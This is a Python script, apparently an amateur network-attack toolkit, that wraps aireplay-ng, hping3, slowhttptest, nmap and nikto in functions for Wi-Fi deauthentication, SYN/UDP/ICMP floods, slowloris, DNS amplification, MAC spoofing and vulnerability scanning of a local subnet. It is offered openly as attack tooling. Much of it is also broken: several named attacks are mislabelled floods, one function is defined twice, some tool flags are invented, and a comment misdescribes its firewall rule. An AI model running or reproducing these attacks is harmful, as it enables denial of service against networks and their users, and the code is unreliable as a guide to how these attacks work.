import subprocess
import time
import random
import string
import netifaces

def random_mac():
    return ":".join([hex(random.randint(0x00, 0xff))[2:].zfill(2) for _ in range(6)])

def deauth_attack(network):
    subprocess.run(['aireplay-ng', '-0', '0', '-a', network.strip(), '-c', 'FF:FF:FF:FF:FF:FF', 'wlan0'], check=True)

def ping_of_death_attack(target_ip):
    subprocess.run(['ping', '-s', '65507', '-f', target_ip], check=True)

def send_spam_packets(target_ip):
    subprocess.run(['hping3', '-c', '10000', '-d', '120', '-S', '-w', '64', '-p', '80', '--flood', '--rand-source', target_ip], check=True)

def switch_mac_address():
    subprocess.run(['ifconfig', 'wlan0', 'down'], check=True)
    subprocess.run(['macchanger', '-p', 'wlan0'], check=True)
    subprocess.run(['ifconfig', 'wlan0', 'up'], check=True)

def trigger_firewalls(target_ip):
    subprocess.run(['nmap', '-p', '1-65535', '-Pn', '--max-retries', '1', '--max-rtt-timeout', '100ms', target_ip], check=True)

def syn_flood_attack(target_ip):
    subprocess.run(['hping3', '--flood', '--rand-source', '-S', '-p', '80', target_ip], check=True)

def udp_flood_attack(target_ip):
    subprocess.run(['hping3', '--flood', '--rand-source', '-2', '-p', '80', target_ip], check=True)

def icmp_flood_attack(target_ip):
    subprocess.run(['hping3', '--flood', '--rand-source', '--icmp', target_ip], check=True)

def slowloris_attack(target_ip):
    subprocess.run(['slowhttptest', '-c', '1000', '-H', '-g', '-o', '/dev/null', '-i', '10', '-r', '200', '-t', 'GET', '-u', 'https://'+target_ip], check=True)

def smurf_attack(target_ip):
    subprocess.run(['smurf', '-c', '1000', '-m', '255.255.255.255', target_ip], check=True)

def dns_amplification_attack(target_ip, dns_servers):
    for dns_server in dns_servers:
        subprocess.run(['hping3', '--flood', '--rand-source', '--udp', '-p', '53', '-d', '500', '--sign', '--keep', '--dns', dns_server, target_ip], check=True)

def land_attack(target_ip):
    subprocess.run(['hping3', '--flood', '--rand-source', '-S', '-p', '80', '-a', target_ip, target_ip], check=True)

def teardrop_attack(target_ip):
    subprocess.run(['hping3', '--flood', '--rand-source', '-S', '-p', '80', '--flood', target_ip], check=True)

def bonk_attack(target_ip):
    subprocess.run(['hping3', '--flood', '--rand-source', '-S', '-p', '123', target_ip], check=True)

def winnuke_attack(target_ip):
    subprocess.run(['hping3', '--flood', '--rand-source', '-S', '-p', '139', target_ip], check=True)

def jolt_attack(target_ip):
    subprocess.run(['hping3', '--flood', '--rand-source', '-S', '-p', '80', '--flood', '--icmp', target_ip], check=True)

def land_attack(target_ip):
    subprocess.run(['hping3', '--flood', '--rand-source', '-S', '-p', '80', '-a', target_ip, target_ip], check=True)

def generate_encrypted_message():
    message = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(100))
    return message.encode().hex()

def send_encrypted_ping(target_ip, message):
    subprocess.run(['ping', '-c', '1', '-p', message, target_ip], check=True)

def execute_hacking_tools():
    nmap_command = "nmap -sn 192.168.0.0/24"  # Replace with the desired IP range
    subprocess.run(nmap_command, shell=True)

    nmap_vuln_command = "nmap -Pn -p- --script vuln 192.168.0.0/24"  # Replace with the desired IP range
    subprocess.run(nmap_vuln_command, shell=True)

    nikto_command = "nikto -h 192.168.0.0/24"  # Replace with the desired IP range
    subprocess.run(nikto_command, shell=True)


# Drop all deauth packets from incoming traffic
subprocess.run(['iptables', '-I', 'INPUT', '-p', 'icmp', '--icmp-type', '13', '-j', 'DROP'], check=True)

while True:
    try:
        output = subprocess.run(['iwlist', 'wlan0', 'scan'], capture_output=True, text=True, check=True).stdout
        networks = [line.split(':')[1] for line in output.split('\n') if 'ESSID' in line]
        default_gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
        target_ip = input("Enter the target IP address (default: gateway IP): ") or default_gateway
        dns_servers = ["8.8.8.8", "8.8.4.4"]  # Replace with valid DNS server IPs
        execute_hacking_tools()

    except KeyboardInterrupt:
        break
